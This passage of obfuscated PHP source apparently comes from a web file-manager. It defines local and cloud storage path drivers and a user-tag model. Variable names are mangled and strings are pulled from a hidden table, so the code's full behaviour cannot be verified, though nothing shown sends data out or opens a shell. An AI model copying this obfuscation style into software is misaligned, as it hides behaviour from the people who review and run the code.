$“ãš¤²[$¥Ö—òŠæ]; } } return $µşÈÎĞÒ; } } goto BİˆÅ‘•ÒÚ; D¿Š†¨ÕÅ¸: class PathDriverLocal extends PathDriverBase { private $pathAuth; public function __construct() { parent::__construct(); $this->pathAuth = DEFAULT_PERRMISSIONS; } public function getPath($€„…ò¥Î) { if (substr($€„…ò¥Î, 0, 2) == $_SERVER[¼’ç§¼´][1420]) { $€„…ò¥Î = BASIC_PATH . substr($€„…ò¥Î, 2); } return $€„…ò¥Î; } public function iconvApp($–ïä¼ÎÈ) { $ê­ŠÈ€ã =& $_SERVER[¼’ç§¼´]; global $config; return $this->iconvTo($–ïä¼ÎÈ, $config[$ê­ŠÈ€ã[1449]], $config[$ê­ŠÈ€ã[1448]]); } public function iconvSystem($Å·ú€™) { $€…†³ø© =& $_SERVER[¼’ç§¼´]; global $config; return $this->iconvTo($Å·ú€™, $config[$€…†³ø©[1448]], $config[$€…†³ø©[1449]]); } public function getPathOuter($şâìşÉ) { $†¬Èº† =& $_SERVER[¼’ç§¼´]; $ÌÂÀ¸Ã¶ = $this->iconvApp($this->pathBase); $şâìşÉ = $this->iconvApp($şâìşÉ); if (substr($ÌÂÀ¸Ã¶, 0, 2) == $†¬Èº†[1420]) { $ÌÂÀ¸Ã¶ = BASIC_PATH . substr($ÌÂÀ¸Ã¶, 2); } if (substr($şâìşÉ, 0, 2) == $†¬Èº†[1420]) { $şâìşÉ = BASIC_PATH . substr($şâìşÉ, 2); } $ÌÂÀ¸Ã¶ = KodIO::clear($ÌÂÀ¸Ã¶); $şâìşÉ = KodIO::clear($şâìşÉ); $şâìşÉ = substr($şâìşÉ, strlen($ÌÂÀ¸Ã¶)); if (empty($this->pathDriver)) { return $şâìşÉ; } return $this->pathDriver . $†¬Èº†[8] . ltrim($şâìşÉ, $†¬Èº†[8]); } public function mkfile($Æ¢‰—Ö, $ÂÏ‰´±± = '', $ÊàÂòõÇ = REPEAT_RENAME) { $Æ¢‰—Ö = $this->iconvSystem($Æ¢‰—Ö); @touch($Æ¢‰—Ö); if ($ÂÏ‰´±±) { file_put_contents($Æ¢‰—Ö, $ÂÏ‰´±±); } @chmod($Æ¢‰—Ö, $this->pathAuth); if (is_file($Æ¢‰—Ö)) { return $this->getPathOuter($Æ¢‰—Ö); } $this->writeLog(__FUNCTION__ . $_SERVER[¼’ç§¼´][1460], !0); return !1; } public function mkdir($àø‡ò¸Ø, $¥Æş’ş = REPEAT_SKIP) { $àø‡ò¸Ø = $this->iconvSystem($àø‡ò¸Ø); if (is_dir($àø‡ò¸Ø)) { return $this->getPathOuter($àø‡ò¸Ø); } @mkdir($àø‡ò¸Ø, $this->pathAuth, !0); @chmod($àø‡ò¸Ø, $this->pathAuth); if (is_dir($àø‡ò¸Ø)) { return $this->getPathOuter($àø‡ò¸Ø); } $this->writeLog(__FUNCTION__ . $_SERVER[¼’ç§¼´][1460], !0); return !1; } public function copyFile($ÔÄ«×Ğë, $¢ùš×ı) { $this->mkdir($this->pathFather($¢ùš×ı)); $ÔÄ«×Ğë = $this->iconvSystem($ÔÄ«×Ğë); $¢ùš×ı = $this->iconvSystem($¢ùš×ı); $®ìËôš» = copy_64($ÔÄ«×Ğë, $¢ùš×ı); @chmod($¢ùš×ı, $this->pathAuth); if ($®ìËôš») { return $this->getPathOuter($¢ùš×ı); } $this->writeLog(__FUNCTION__ . $_SERVER[¼’ç§¼´][1460], !0); return !1; } public function moveFile($üÒı¥…µ, $®ƒÊ‡”‘) { $this->mkdir($this->pathFather($®ƒÊ‡”‘)); $üÒı¥…µ = $this->iconvSystem($üÒı¥…µ); $®ƒÊ‡”‘ = $this->iconvSystem($®ƒÊ‡”‘); $ï‚›çÖ— = intval(@rename($üÒı¥…µ, $®ƒÊ‡”‘)); if (!$ï‚›çÖ—) { if ($ï‚›çÖ— = intval(@copy_64($üÒı¥…µ, $®ƒÊ‡”‘))) { @unlink($üÒı¥…µ); } } @chmod($®ƒÊ‡”‘, $this->pathAuth); if ($ï‚›çÖ—) { return $this->getPathOuter($®ƒÊ‡”‘); } $this->writeLog(__FUNCTION__ . $_SERVER[¼’ç§¼´][1460], !0); return !1; } public function movePath($şÇ„²ç, $£“˜”¨Ü, $½÷¾Íø„ = false) { $ÊëşÆŠš =& $_SERVER[¼’ç§¼´]; $şÇ„²ç = $this->iconvSystem($şÇ„²ç); $£“˜”¨Ü = $this->iconvSystem($£“˜”¨Ü); $×¯öš¥Ò = rtrim($£“˜”¨Ü, $ÊëşÆŠš[8]) . $ÊëşÆŠš[8] . ($½÷¾Íø„ ? $½÷¾Íø„ : get_path_this($şÇ„²ç)); if (file_exists($×¯öš¥Ò)) { return !1; } $½ûÎµ›ò = intval(@rename($şÇ„²ç, $×¯öš¥Ò)); $½ûÎµ›ò = file_exists($×¯öš¥Ò); if ($½ûÎµ›ò) { return $this->getPathOuter($×¯öš¥Ò); } $this->writeLog(__FUNCTION__ . $ÊëşÆŠš[1460], !0); return !1; } public function delFile($æâÔÇìŒ) { $æâÔÇìŒ = $this->iconvSystem($æâÔÇìŒ); if (!@unlink($æâÔÇìŒ)) { @chmod($æâÔÇìŒ, $this->pathAuth); if (@unlink($æâÔÇìŒ)) { return !0; } $this->writeLog(__FUNCTION__ . $_SERVER[¼’ç§¼´][1460], !0); return !1; } return !0; } public function delFolder($“õïúé™) { $˜èùÁ º =& $_SERVER[¼’ç§¼´]; $“õïúé™ = $this->iconvSystem($“õïúé™); if (!is_dir($“õïúé™)) { return !0; } if (!($ãŒåÑ  = opendir($“õïúé™))) { return !1; } while (($­ŠêôÎé = readdir($ãŒåÑ )) !== !1) { if ($­ŠêôÎé == $˜èùÁ º[10] || $­ŠêôÎé == $˜èùÁ º[1372]) { continue; } $ì„£ùÓ = $“õïúé™ . $˜èùÁ º[8] . $­ŠêôÎé; if (is_file($ì„£ùÓ) || is_link($ì„£ùÓ)) { if (!unlink($ì„£ùÓ)) { chmod($ì„£ùÓ, $this->pathAuth); if (!unlink($ì„£ùÓ)) { return !1; } } } else { if (is_dir($ì„£ùÓ)) { chmod($ì„£ùÓ, $this->pathAuth); $ì„£ùÓ = $this->iconvApp($ì„£ùÓ); if (!$this->delFolder($ì„£ùÓ)) { return !1; } } } } closedir($ãŒåÑ ); return rmdir($“õïúé™); } public function rename($ÁìÂº‘é, $¾ÙÁ²Š«) { $Å÷®Çş’ =& $_SERVER[¼’ç§¼´]; $ˆ©ò˜Ó = $this->fileNameAuto($this->pathFather($ÁìÂº‘é), $¾ÙÁ²Š«); $ˆ©ò˜Ó = $this->iconvSystem($ˆ©ò˜Ó); $ÁìÂº‘é = $this->iconvSystem($ÁìÂº‘é); $©´¢»ø = $this->pathFather($ÁìÂº‘é); $à·øÃ™ = rtrim($©´¢»ø, $Å÷®Çş’[8]) . $Å÷®Çş’[8] . $ˆ©ò˜Ó; $ä¹‚ô—å = @rename($ÁìÂº‘é, $à·øÃ™); $à·øÃ™ = $this->iconvApp($à·øÃ™); if ($ä¹‚ô—å) { return $this->getPathOuter($à·øÃ™); } $this->writeLog(__FUNCTION__ . $Å÷®Çş’[1460], !0); return !1; } public function size($ÎÕáÑ†Ä) { $ÎÕáÑ†Ä = $this->iconvSystem($ÎÕáÑ†Ä); return filesize_64($ÎÕáÑ†Ä); } public function info($‚¥£Ô‹Å) { $‚¥£Ô‹Å = $this->iconvSystem($‚¥£Ô‹Å); if ($this->isFolder($‚¥£Ô‹Å)) { return $this->folderInfo($‚¥£Ô‹Å); } else { if ($this->isFile($‚¥£Ô‹Å)) { return $this->fileInfo($‚¥£Ô‹Å); } } return !1; } protected function infoChildren($³úîé, &$¤ßåÑï“, $µ™»Æ±ï = true) { $ÊËÆ•Ç¡ =& $_SERVER[¼’ç§¼´]; check_abort_echo(); $³úîé = rtrim($³úîé, $ÊËÆ•Ç¡[8]) . $ÊËÆ•Ç¡[8]; if ($µ™»Æ±ï) { $³úîé = $this->iconvSystem($³úîé); } if (!($¨İšå² = @opendir($³úîé))) { return; } while (($¢ò‘À¨í = readdir($¨İšå²)) !== !1) { if ($¢ò‘À¨í == $ÊËÆ•Ç¡[10] || $¢ò‘À¨í == $ÊËÆ•Ç¡[1372]) { continue; } $Æ¤•Õ¯È = $³úîé . $¢ò‘À¨í; if (is_file($Æ¤•Õ¯È) || is_link($Æ¤•Õ¯È)) { $¤ßåÑï“[$ÊËÆ•Ç¡[80]]++; $¤ßåÑï“[$ÊËÆ•Ç¡[79]] += filesize_64($Æ¤•Õ¯È); } else { if (is_dir($Æ¤•Õ¯È)) { $¤ßåÑï“[$ÊËÆ•Ç¡[81]]++; $this->infoChildren($Æ¤•Õ¯È, $¤ßåÑï“, !1); } } } closedir($¨İšå²); } private function folderInfo($åºê…°Ì, $Ğ§¨ôüÇ = false) { $ªòŠ®ôŞ =& $_SERVER[¼’ç§¼´]; $åºê…°Ì = rtrim($åºê…°Ì, $ªòŠ®ôŞ[8]) . $ªòŠ®ôŞ[8]; $’‚©—©¶ = $this->iconvApp($this->pathThis($åºê…°Ì)); if ($Ğ§¨ôüÇ) { return array($ªòŠ®ôŞ[32] => $’‚©—©¶, $ªòŠ®ôŞ[87] => $this->getPathOuter($åºê…°Ì), $ªòŠ®ôŞ[33] => $ªòŠ®ôŞ[78]); } $Šà Û « = array($ªòŠ®ôŞ[32] => $’‚©—©¶, $ªòŠ®ôŞ[87] => $this->getPathOuter($åºê…°Ì), $ªòŠ®ôŞ[33] => $ªòŠ®ôŞ[78], $ªòŠ®ôŞ[233] => @filectime($åºê…°Ì), $ªòŠ®ôŞ[88] => @filemtime($åºê…°Ì), $ªòŠ®ôŞ[1464] => @fileatime($åºê…°Ì), $ªòŠ®ôŞ[1465] => is_readable($åºê…°Ì), $ªòŠ®ôŞ[1466] => is_writable($åºê…°Ì), $ªòŠ®ôŞ[1467] => get_mode($åºê…°Ì)); return $Šà Û «; } private function fileInfo($¥Öşë¬ı, $şÑ–ßÀ° = false) { $„‚…±Ã =& $_SERVER[¼’ç§¼´]; $•Ô»ñ´ş = $this->iconvApp($this->pathThis($¥Öşë¬ı)); if ($şÑ–ßÀ°) { return array($„‚…±Ã[32] => $•Ô»ñ´ş, $„‚…±Ã[87] => $this->getPathOuter($¥Öşë¬ı), $„‚…±Ã[33] => $„‚…±Ã[232], $„‚…±Ã[79] => $this->size($¥Öşë¬ı), $„‚…±Ã[169] => $this->ext($•Ô»ñ´ş)); } $ÃÒªå• = array($„‚…±Ã[32] => $•Ô»ñ´ş, $„‚…±Ã[87] => $this->getPathOuter($¥Öşë¬ı), $„‚…±Ã[33] => $„‚…±Ã[232], $„‚…±Ã[233] => @filectime($¥Öşë¬ı), $„‚…±Ã[88] => @filemtime($¥Öşë¬ı), $„‚…±Ã[1464] => @fileatime($¥Öşë¬ı), $„‚…±Ã[79] => $this->size($¥Öşë¬ı), $„‚…±Ã[169] => $this->ext($•Ô»ñ´ş), $„‚…±Ã[1465] => is_readable($¥Öşë¬ı), $„‚…±Ã[1466] => is_writable($¥Öşë¬ı), $„‚…±Ã[1467] => get_mode($¥Öşë¬ı)); return $ÃÒªå•; } public function exist($ÛªıŒò) { $ÛªıŒò = $this->iconvSystem($ÛªıŒò); return @file_exists($ÛªıŒò); } public function isFile($÷”¥¹ûÓ) { $÷”¥¹ûÓ = $this->iconvSystem($÷”¥¹ûÓ); return @is_file($÷”¥¹ûÓ); } public function isFolder($æÁÙ·ôÎ) { $æÁÙ·ôÎ = $this->iconvSystem($æÁÙ·ôÎ); return @is_dir($æÁÙ·ôÎ); } public function listPath($ë£Ï“º×, $àù˜íªÑ = false) { $Š¢ÜîÚÊ =& $_SERVER[¼’ç§¼´]; $ë£Ï“º× = $this->iconvSystem($ë£Ï“º×); $ë£Ï“º× = rtrim($ë£Ï“º×, $Š¢ÜîÚÊ[8]) . $Š¢ÜîÚÊ[8]; $ŞÇ²Ä„ = array($Š¢ÜîÚÊ[85] => array(), $Š¢ÜîÚÊ[86] => array()); if (!($­Ûª„í» = @opendir($ë£Ï“º×))) { return $ŞÇ²Ä„; } while (($éÄÄ¨™  = readdir($­Ûª„í»)) !== !1) { if ($éÄÄ¨™  == $Š¢ÜîÚÊ[10] || $éÄÄ¨™  == $Š¢ÜîÚÊ[1372]) { continue; } $Ò¦°Íóû = $ë£Ï“º× . $éÄÄ¨™ ; if (is_file($Ò¦°Íóû)) { $ŞÇ²Ä„[$Š¢ÜîÚÊ[86]][] = $this->fileInfo($Ò¦°Íóû, $àù˜íªÑ); } else { $ŞÇ²Ä„[$Š¢ÜîÚÊ[85]][] = $this->folderInfo($Ò¦°Íóû, $àù˜íªÑ); } } closedir($­Ûª„í»); return $ŞÇ²Ä„; } public function listAll($ÂÑ¿ÑÒ™, &$²œ ¸˜Ã = array()) { $©°ò‘½Æ =& $_SERVER[¼’ç§¼´]; $ÂÑ¿ÑÒ™ = $this->iconvSystem($ÂÑ¿ÑÒ™); $ÂÑ¿ÑÒ™ = rtrim($ÂÑ¿ÑÒ™, $©°ò‘½Æ[8]) . $©°ò‘½Æ[8]; if (!($’Š¾éğ¹ = @opendir($ÂÑ¿ÑÒ™))) { return $²œ ¸˜Ã; } while (($À‡éì¦¥ = readdir($’Š¾éğ¹)) !== !1) { if ($À‡éì¦¥ == $©°ò‘½Æ[10] || $À‡éì¦¥ == $©°ò‘½Æ[1372]) { continue; } $ş’Æº¬ = $ÂÑ¿ÑÒ™ . $À‡éì¦¥; $Îòì”–Œ = is_dir($ş’Æº¬) && !is_link($ş’Æº¬) ? 1 : 0; $ş’Æº¬ = $Îòì”–Œ ? $ş’Æº¬ . $©°ò‘½Æ[8] : $ş’Æº¬; $²œ ¸˜Ã[] = array($©°ò‘½Æ[87] => $ş’Æº¬, $©°ò‘½Æ[78] => $Îòì”–Œ, $©°ò‘½Æ[88] => intval(@filemtime($ş’Æº¬)), $©°ò‘½Æ[79] => $Îòì”–Œ ? 0 : intval($this->size($ş’Æº¬))); if ($Îòì”–Œ) { $this->listAll($ş’Æº¬, $²œ ¸˜Ã); } } closedir($’Š¾éğ¹); return $²œ ¸˜Ã; } public function has($ôå¡–Ş, $Îõ¼ƒø = false, $ğŸïÈ«½ = true) { $şàñÑñÉ =& $_SERVER[¼’ç§¼´]; $ôå¡–Ş = $this->iconvSystem($ôå¡–Ş); $ôå¡–Ş = rtrim($ôå¡–Ş, $şàñÑñÉ[8]) . $şàñÑñÉ[8]; if (!($‡îƒ¿Òô = @opendir($ôå¡–Ş))) { return !1; } $éÉÜñÓı = 0; $àµµƒ¿„ = 0; $§Óòôõ¨ = 0; while (($´³½ğ—‚ = readdir($‡îƒ¿Òô)) !== !1) { if ($´³½ğ—‚ == $şàñÑñÉ[10] || $´³½ğ—‚ == $şàñÑñÉ[1372]) { continue; } $»¼•‘Çù = $ôå¡–Ş . $´³½ğ—‚; if ($Îõ¼ƒø) { $§Óòôõ¨++; if (@is_file($»¼•‘Çù)) { $éÉÜñÓı++; } else { $àµµƒ¿„++; } if ($§Óòôõ¨ > 10000) { break; } continue; } if ($ğŸïÈ«½) { if (@is_file($»¼•‘Çù)) { return !0; } } else { if (@is_dir($»¼•‘Çù . $şàñÑñÉ[8])) { return !0; } } } closedir($‡îƒ¿Òô); if ($Îõ¼ƒø) { return array($şàñÑñÉ[241] => $éÉÜñÓı, $şàñÑñÉ[242] => $àµµƒ¿„); } return !1; } public function hashSimple($Ÿ½úËŠ) { $‰„¾±îÖ =& $_SERVER[¼’ç§¼´]; if (!$Ÿ½úËŠ) { return md5($‰„¾±îÖ[12]); } $Ÿ½úËŠ = $this->iconvSystem($Ÿ½úËŠ); $°±‡¶´× = $this->size($Ÿ½úËŠ); $•½Åı¼Ò = 200; $‘›—áì° = 50; if ($°±‡¶´× <= $•½Åı¼Ò * $‘›—áì°) { return $this->hashMd5($Ÿ½úËŠ) . $°±‡¶´×; } $“¿Ïğı§ = $‰„¾±îÖ[12]; $«ÔÍÓªå = intval($°±‡¶´× / $‘›—áì°); $Ëš¯¹”ğ = fopen($Ÿ½úËŠ, $‰„¾±îÖ[1468]); if (!$Ëš¯¹”ğ) { return $“¿Ïğı§; } for ($­¿ÂÉÄú = 0; $­¿ÂÉÄú < $‘›—áì°; $­¿ÂÉÄú++) { fseek_64($Ëš¯¹”ğ, $«ÔÍÓªå * $­¿ÂÉÄú); $“¿Ïğı§ .= fread($Ëš¯¹”ğ, $•½Åı¼Ò); } fseek_64($Ëš¯¹”ğ, $°±‡¶´× - $•½Åı¼Ò); $“¿Ïğı§ .= fread($Ëš¯¹”ğ, $•½Åı¼Ò); fclose($Ëš¯¹”ğ); return md5($“¿Ïğı§) . $°±‡¶´×; } public function getContent($¬º§ñ¢¤) { $¬º§ñ¢¤ = $this->iconvSystem($¬º§ñ¢¤); return file_get_contents($¬º§ñ¢¤); } public function setContent($òà‰õÌ÷, $¢ÛÄÌå© = '') { $òà‰õÌ÷ = $this->iconvSystem($òà‰õÌ÷); $Üß™İÛŸ = @file_put_contents($òà‰õÌ÷, $¢ÛÄÌå©, LOCK_EX); if (!$Üß™İÛŸ) { $this->writeLog(__FUNCTION__ . $_SERVER[¼’ç§¼´][1460], !0); } clearstatcache(); @chmod($òà‰õÌ÷, $this->pathAuth); return $Üß™İÛŸ === !1 ? !1 : !0; } public function fileSubstr($·Ï¯Şı”, $Íâç·‡ = 0, $éÌı‘Ş• = false) { $ºª…ŸÙÍ =& $_SERVER[¼’ç§¼´]; $·Ï¯Şı” = $this->iconvSystem($·Ï¯Şı”); if ($éÌı‘Ş• === !1) { $éÌı‘Ş• = $this->size($·Ï¯Şı”); } if ($éÌı‘Ş• <= 0) { return $ºª…ŸÙÍ[12]; } $©“«®§¤ = fopen($·Ï¯Şı”, $ºª…ŸÙÍ[1468]); if (!$©“«®§¤) { return !1; } fseek_64($©“«®§¤, $Íâç·‡); $×¡¬‚×˜ = fread($©“«®§¤, $éÌı‘Ş•); fclose($©“«®§¤); if (!$×¡¬‚×˜) { $this->writeLog(__FUNCTION__ . $ºª…ŸÙÍ[1460], !0); } return $×¡¬‚×˜; } public function upload($‡ˆ¨±É, $ßÆæ˜ ‚, $ƒò¢§ÃŒ = false, $ùç¥×¡¢ = REPEAT_REPLACE) { if ($ƒò¢§ÃŒ) { return $this->moveFile($ßÆæ˜ ‚, $‡ˆ¨±É); } return $this->copyFile($ßÆæ˜ ‚, $‡ˆ¨±É); } public function setModifyTime($Ü¡¥Ô–ä, $Ã¾™‡î÷ = '') { @touch($Ü¡¥Ô–ä, intval($Ã¾™‡î÷)); } public function download($ôŞ…ûß¦, $§Çşã‚©) { return $this->iconvSystem($ôŞ…ûß¦); } } class PathDriverOBS extends PathDriverBaseS3 { public function __construct($ğÉ‘„ö¥) { parent::__construct($ğÉ‘„ö¥); $this->setSignVersion($_SERVER[¼’ç§¼´][249]); } public function fileOutImage($å¨ı³ş, $‚ËÂÊåø = 250) { $Ç­€ÂµÉ =& $_SERVER[¼’ç§¼´]; if ($this->size($å¨ı³ş) > 1024 * 1024 * 25) { return $this->fileOutImageServer($å¨ı³ş, $‚ËÂÊåø); } $ı¥æÛôÃ = array($Ç­€ÂµÉ[1469] => $Ç­€ÂµÉ[1470] . $‚ËÂÊåø . $Ç­€ÂµÉ[1471]); $Æ¤›úĞ¸ = $this->link($å¨ı³ş, $ı¥æÛôÃ); $this->fileOutLink($Æ¤›úĞ¸); } public function fileOutLink($À€¶ş) { $­¤ÏÕ =& $_SERVER[¼’ç§¼´]; if (substr($À€¶ş, 0, 7) == $­¤ÏÕ[218]) { $À€¶ş = $­¤ÏÕ[219] . substr($À€¶ş, 7); } header($­¤ÏÕ[175] . $À€¶ş); die; } } class PathDriverOOS extends PathDriverBaseS3 { public function __construct($Å‘ã”Á) { parent::__construct($Å‘ã”Á); $this->setSignVersion($_SERVER[¼’ç§¼´][249]); } public function fileOutLink($©œ±éÊŒ) { $×¨­Ééì =& $_SERVER[¼’ç§¼´]; if (substr($©œ±éÊŒ, 0, 7) == $×¨­Ééì[218]) { $©œ±éÊŒ = $×¨­Ééì[219] . substr($©œ±éÊŒ, 7); } header($×¨­Ééì[175] . $©œ±éÊŒ); die; } public function uploadFormData($Ñ‹ò¬ú¿, $Àµ“Î½™ = 3600) { return $this->uploadFormDataV2($Ñ‹ò¬ú¿, $Àµ“Î½™); } } goto f¨‡Ûôğ“”; eœ÷è“ŠÉÉ: class UserTagSourceModel extends ModelBase { protected $tableName = "\165\x73\145\162\137\146\141\166"; protected function cacheFunctionAlias($£şõÒ) { $áÏ©‘Äï =& $_SERVER[¼’ç§¼´]; return array($áÏ©‘Äï[2099] => array($áÏ©‘Äï[2524] . USER_ID, $áÏ©‘Äï[2100])); } protected function listData() { $å¸óİû =& $_SERVER[¼’ç§¼´]; $ÚÂìá´… = array($å¸óİû[1774] => USER_ID, $å¸óİû[568] => array($å¸óİû[2103], 0)); $ñ“´§Ò = $å¸óİû[2525]; $€¹°Š€à = $this->field($ñ“´§Ò)->where($ÚÂìá´…)->order($å¸óİû[2106])->select(); return $€¹°Š€à ? $€¹°Š€à : array(); } protected function addToTag($ö–àÑÛŸ, $úÆËƒá¾) { $şÔÏÉ¨™ =& $_SERVER[¼’ç§¼´]; if (!Model($şÔÏÉ¨™[2252])->listData($úÆËƒá¾)) { return !1; } if (is_numeric($ö–àÑÛŸ)) { $³ Ûˆõ‹ = Model($şÔÏÉ¨™[913])->pathInfo($ö–àÑÛŸ); if (!$³ Ûˆõ‹) { return !1; } } else { $³ Ûˆõ‹ = IO::infoSimple($ö–àÑÛŸ); if (!$³ Ûˆõ‹) { return !1; } $¼ïÙ™Ô = $³ Ûˆõ‹[$şÔÏÉ¨™[32]]; $ ±ƒÜé = $³ Ûˆõ‹[$şÔÏÉ¨™[33]]; if (isset($³ Ûˆõ‹[$şÔÏÉ¨™[496]])) { $ ±ƒÜé = $³ Ûˆõ‹[$şÔÏÉ¨™[496]] == $şÔÏÉ¨™[91] ? $şÔÏÉ¨™[78] : $şÔÏÉ¨™[232]; } } $íÙùÀ¤á = array($şÔÏÉ¨™[1774] => USER_ID, $şÔÏÉ¨™[568] => $úÆËƒá¾, $şÔÏÉ¨™[506] => $ö–àÑÛŸ, $şÔÏÉ¨™[507] => $ ±ƒÜé ? $ ±ƒÜé : $şÔÏÉ¨™[501], $şÔÏÉ¨™[505] => $¼ïÙ™Ô ? $¼ïÙ™Ô : $şÔÏÉ¨™[12], $şÔÏÉ¨™[1988] => 0); if ($this->where($íÙùÀ¤á)->find()) { return !1; } return $this->add($íÙùÀ¤á); } protected function removeFromTag($ÍÜ’Öõ, $‘¿‹Ú‡) { $½Ï©¼•è =& $_SERVER[¼’ç§¼´]; if (!Model($½Ï©¼•è[2252])->listData($‘¿‹Ú‡)) { return !1; } if (is_array($ÍÜ’Öõ)) { $ÍÜ’Öõ = array($½Ï©¼•è[7], $ÍÜ’Öõ); } $÷ØäŠ­İ = array($½Ï©¼•è[1774] => USER_ID, $½Ï©¼•è[568] => $‘¿‹Ú‡, $½Ï©¼•è[506] => $ÍÜ’Öõ); return $this->where($÷ØäŠ­İ)->delete(); } protected function removeByTag($©•úÇÌ) { $ç¯»øÍ® =& $_SERVER[¼’ç§¼´]; if (!$©•úÇÌ) { return !1; } $ó­‘§Ë« = array($ç¯»øÍ®[1774] => USER_ID, $ç¯»øÍ®[568] => $©•úÇÌ); return $this->where($ó­‘§Ë«)->delete(); } protected function removeBySource($ºøìÖ¢‚) { $Şï–Š‡ì =& $_SERVER[¼’ç§¼´]; if (is_array($ºøìÖ¢‚)) { $ºøìÖ¢‚ = array($Şï–Š‡ì[7], $ºøìÖ¢‚); } $è›Ë¬¯˜ = array($Şï–Š‡ì[1774] => USER_ID, $Şï–Š‡ì[568] => array($Şï–Š‡ì[1100], 0), $Şï–Š‡ì[506] => $ºøìÖ¢‚); return $this->where($è›Ë¬¯˜)->delete(); } }